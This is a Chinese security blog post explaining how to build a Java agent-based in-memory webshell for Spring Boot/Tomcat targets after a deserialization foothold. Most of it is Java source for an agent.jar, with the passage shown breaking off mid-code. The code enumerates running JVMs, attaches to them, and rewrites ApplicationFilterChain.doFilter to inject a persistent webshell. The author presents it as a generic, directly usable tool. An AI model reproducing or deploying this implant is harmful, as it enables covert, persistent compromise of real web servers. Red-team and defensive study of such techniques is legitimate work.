---
title: 初识Java agent类型内存马
url: https://mp.weixin.qq.com/s?__biz=Mzg3NzczOTA3OQ==&mid=2247485840&idx=1&sn=2415ed871482da0a9a63d812f508587e&chksm=cf1f24b8f868adae0077f8400c2247b252e248c71680ebb4f6dae8fa87bd00cc0d41f8bbcf76&scene=58&subscene=0#rd
source: RainSec
date: 2023-03-31
fetch_date: 2025-10-04T11:17:15.789804
---

# 初识Java agent类型内存马

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/LxlshmzkAkYJhhwiawreI80gTbjM30B1Mgq8uFmyFXlIfq7X6nN33dctQl82oRfGvTCGkwbHVRsE3PZwpt5kK8Q/0?wx_fmt=jpeg)

# 初识Java agent类型内存马

原创

COP

RainSec

## 初识Java agent类型内存马

![](https://mmbiz.qpic.cn/mmbiz_png/LxlshmzkAkb1yDnVcgIlvd3KG3vX76egiaDfKT3XbKmjGJjIa3foicznOnreTcvrRwtccfNAZ4I8TuibyIuNnkiatQ/640?wx_fmt=png)

### 前言

  你是否遇到过这样的场景，springboot环境下各种反序列化的点，但是可用的反序列化链不能直接加载类打入内存马，只能执行系统命令，甚至目标环境不出网，或者已经反弹shell或cs上线成功了，但是想要注入一个webshell。这时候就需要用到agent类型内存马了。

### 前置知识点

  JavaAgent 是JDK 1.5 以后引入的，可以在Java程序运行之前或运行期间修改类的字节码，Java agent可以是一个编译好的jar文件，使用方式有两种：

* • 实现premain方法，在JVM启动前加载。
* • 实现agentmain方法，在JVM启动后加载。(jdk 1.6 之后提供)

  实现了premain方法的agent 就可以在启动Java程序时使用 -javaagent 参数来加载。

  实现了agentmain方法的agent可以通过进程pid来连接到启动后的Java程序上。 agentmain方法声明如下，拥有Instrumentation inst参数的方法优先级更高：

```
public static void premain(String agentArgs, Instrumentation inst) {
    ...
}

public static void premain(String agentArgs) {
    ...
}
```

* • 第一个参数String agentArgs就是Java agent的参数。
* • 第二个参数Instrumentaion inst比较重要，有三个需要用到的方法：

1. 1. getAllLoadedClasses:获取目标已经加载的类。
2. 2. addTransformer:增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。
3. 3. retransformClasses: 在类加载之后，重新定义 Class。

Agent实现主要依靠VirtualMachine和VirtualMachineDescriptor这两个类

```
VirtualMachine
VirtualMachine可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。

Attach：允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上
loadAgent：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。
Detach：解除Attach
VirtualMachineDescriptor
 VirtualMachineDescriptor是用于描述 Java 虚拟机的容器类。它封装了一个标识目标虚拟机的标识符，以及一个AttachProvider在尝试连接到虚拟机时应该使用的引用。标识符依赖于实现，但通常是进程标识符（或 pid）环境，其中每个 Java 虚拟机在其自己的操作系统进程中运行。

 VirtualMachineDescriptor实例通常是通过调用VirtualMachine.list() 方法创建的。这将返回描述所有已安装 Java 虚拟机的完整描述符列表attach providers。
```

jar包中的MANIFEST.MF 文件必须指定 Agentmain-Class 项，Agentmain-Class 指定的那个类必须实现 agentmain() 方法

### 编写一个agent.jar

  笔者在github找了好久，基本是一些本地调试用的demo，没找到能直接能用的且较为通用的。所以就在 ethushiroha师傅 项目 JavaAgentTools BehindShell 的基础上进行修改。

```
package org.apache.spring;

import java.io.File;
import java.io.IOException;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.List;

public class m {
    public static final String TransformedClassName = c.SpringMemShellConfig.TransformedClassName;
    public static Instrumentation i = null;

    public static void agentmain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException, IOException {
        //启动方法
        i = inst;
        System.out.println("Agent load ...");
        start();
    }

    public static String start() throws UnmodifiableClassException {
        System.out.println("Agent start ...");
        //t继承了ClassFileTransformer接口，重写了transform方法，用于拦截修改加载的类字节码，此方法返回值是通过javassist修改好的字节码，
        final t t1 = new t();
        //获取目标所有已经加载的类
        Class[] classes = i.getAllLoadedClasses();
        for (Class aClass : classes) {
            if (aClass.getName().equals(TransformedClassName)) {
                //这里修改的是org.apache.catalina.core.ApplicationFilterChain类的doFilter方法，测试的时候有一个坑点是测试jar包启动时需要访问一下Web，ApplicationFilterChain类才会加载，上面获取所有类的时候才可以获取到ApplicationFilterChain类。
                System.out.println("Agent get TransformedClassName ...");
                //添加拦截器
                i.addTransformer(t1, true);
                //重新定义ApplicationFilterChain类，触发拦截器也就是t类的transform方法
                i.retransformClasses(aClass);
                return "Success";
            }
        }
        return "ERROR::";
    }
    public static void main(String[] args)
            throws RuntimeException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
                //agent.jar 用到的核心类VirtualMachine和VirtualMachineDescriptor在jdk的tools.jar里，如果直接把tools.jar一块打进agent.jar里，不能跨平台使用，笔者测试mac编译无法在linux中使用
                //通过URLClassLoader加载目标环境的tools.jar，可以变得更加通用
                String toolsJarPath = System.getProperty("java.home") + File.separator + ".." + File.separator + "lib" + File.separator + "tools.jar";
                URLClassLoader classLoader = null;
                try {
                    classLoader = new URLClassLoader(new URL[]{new File(toolsJarPath).toURI().toURL()});
                } catch (MalformedURLException e) {
                    System.err.println("tools.jar load error");
                    System.exit(-1);
                }

                Class<?> vmClass = null;
                Class<?> vmdClass = null;
                try {
                    vmClass = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
                    vmdClass = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
                } catch (ClassNotFoundException e) {
                    e.printStackTrace();
                }
                Object vmObj = null;
                String agentpath = null;
                List<String> list = new ArrayList<String>();
                if (args.length == 2) {
                    list.add(args[0]);
                    agentpath = args[1];
                } else if (args.length==1) {
                    list.add(args[0]);
                    //获取agent.jar的绝对路径
                    agentpath = m.class.getProtectionDomain().getCodeSource().getLocation().getFile();
                } else if (args.length==0) {
                    //通过VirtualMachineDescriptor类的list方法 获取目标环境中运行的Java进程，省去查找pid这一步
                    Method listMethod = vmClass.getDeclaredMethod("list", new Class[]{});
                    List<Object> vmlist = (List<Object>) listMethod.invoke(null);
                    Method idMethod = vmdClass.getDeclaredMethod("id",new Class[]{});
                    Method displayNameMethod= vmdClass.getDeclaredMethod("displayName",new Class[]{});
                    for (Object vmd : vmlist) {
                        System.out.println(String.format("get vmname: %s  pid: %s",(String) displayNameMethod.invoke(vmd),(String) idMethod.invoke(vmd)));
                        list.add((String) idMethod.invoke(vmd));
                    }
                    agentpath = m.class.getProtectionDomain().getCodeSource().getLocation().getFile();
                }else {
                    System.err.println("usage : java -jar agent.jar\r\njava -jar agent.jar pid\r\njava -jar agent.jar pid agentpath");
                    System.err.println("Parameter error");
                    System.exit(-1);
                }

                System.out.println(" agentpath :" + agentpath);
                for (String pid :list){
                    try {
                        System.out.println(String.format("try attach %s",pid));
                        Method attachMethod = null;
                        try {
                            //连接到此Java进程
                            attachMethod = vmClass.getDeclaredMethod("attach", String.class);
                        } catch (NoSuchMethodException e) {
                            e.printStackTrace();
                        }
                        vmObj = (Object) attachMethod.invoke(null, pid);
                        if (vmObj != null) {
                            //加载agent.jar 触发agentmain方法
                            Method loadAgentMethod2 = vmClass.getDeclaredMethod("loadAgent", String.class);
                            loadAgentMethod2.invoke(vmObj, agentpath);

                        }
                    } catch (InvocationTargetException e) {
                        e.printStackTrace();
                    } catch (NoSuchMethodExc...